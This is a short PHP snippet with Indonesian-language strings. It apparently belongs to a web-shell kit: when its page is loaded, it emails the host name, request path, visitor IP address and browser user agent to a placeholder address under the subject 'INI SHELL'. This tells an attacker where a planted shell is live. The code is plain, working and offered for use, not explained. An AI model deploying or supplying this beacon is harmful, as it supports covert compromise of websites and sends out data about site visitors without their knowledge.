<?php
$ip = getenv("REMOTE_ADDR");
$sub = "INI SHELL";
$bro =$_SERVER['HTTP_USER_AGENT'];
$email = "Alamat Email mu njing";
$from = "Shell kamu heheh";
$file = $_SERVER['REQUEST_URI'];
$web = $_SERVER['HTTP_HOST'];
$ipz = $ip . "";
$uatama = "$bro $file $web $ipz";
mail($email, $sub, $uatama, $from);   
?>
